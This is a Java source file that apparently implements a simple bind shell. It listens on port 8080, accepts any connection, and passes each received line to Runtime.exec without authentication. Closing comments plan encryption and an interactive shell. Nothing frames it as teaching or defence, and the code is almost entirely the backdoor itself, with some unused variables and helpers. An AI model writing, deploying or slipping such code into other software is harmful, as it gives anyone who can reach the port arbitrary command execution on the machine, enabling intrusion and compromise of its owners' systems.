import java.util.Scanner; // Import the Scanner class to read user input
import java.net.*; // Import classes for network-related functionality
import java.io.*; // Import classes for input/output operations

public class Main {
    private static Socket s; // Declare a Socket variable for network communication
    private static Scanner sc; // Declare a Scanner for reading input
    private static PrintWriter pr; // Declare a PrintWriter for writing output

    private static int length; // Declare an integer variable 'length'
    private static ProcessBuilder ps; // Declare a ProcessBuilder for executing processes
    private static BufferedReader in; // Declare a BufferedReader for reading input
    private static String line; // Declare a String variable 'line' for storing text
    private static String stdout; // Declare a String variable 'stdout'

    // Function to execute a command and print its output
    private static void execute(String commandAndArgs) throws IOException, InterruptedException {
        String command = commandAndArgs; // Store the command in 'command'

        // Execute the command using Runtime.getRuntime().exec()
        Process proc = Runtime.getRuntime().exec(command);

        // Create a BufferedReader to read the command's output
        BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getInputStream()));
        String Line = "";

        // Read and print each line of output
        while ((Line = reader.readLine()) != null) {
            System.out.println(Line + "\n");
        }

        // Wait for the command to finish executing
        proc.waitFor();
    }

    // Function to resolve a host name to an IP address
    private static String resolve(String host) {
        InetAddress ip;
        while (true) {
            try {
                ip = InetAddress.getByName(host); // Get the IP address for the host
                host = ip.getHostAddress().toString(); // Convert it to a String
                return host; // Return the resolved IP address
            } catch (Exception err) {
                continue;
            }
        }
    }

    // Function to establish a socket connection
    private static int connect(String ip, int port) {
        try {
            s = new Socket(ip, port); // Create a socket connection to the specified IP and port
            return 1; // Return 1 to indicate success
        } catch (Exception err) {
            return 0; // Return 0 to indicate failure
        }
    }

    public static Socket socket; // Declare a public Socket variable 'socket'

    public static void main(String[] args) throws IOException, InterruptedException {
        int port = 8080; // Set the port number to 8080
        String answer;
        String returnedMessage;
        String reply;
        ServerSocket server = new ServerSocket(port); // Create a ServerSocket on port 8080
        System.out.println("Server starts at port " + port + "."); // Print a message

        while (true) { // Start an infinite loop
            socket = server.accept(); // Accept incoming socket connections

            // Set up input streams for communication
            InputStream is = socket.getInputStream();
            InputStreamReader isr = new InputStreamReader(is);
            BufferedReader br = new BufferedReader(isr);

            answer = br.readLine(); // Read a line of input from the client
            System.out.println("sent command from remote: " + answer); // Print the received command

            if ("QUIT".equals(answer)) // Check if the command is "QUIT"
                break; // Exit the loop if "QUIT" is received
            else {
                execute(answer); // Execute the received command and print its output
            }
        }
    }
}


// add error handling
// add ssl or tls encryption
// add interactive shell
//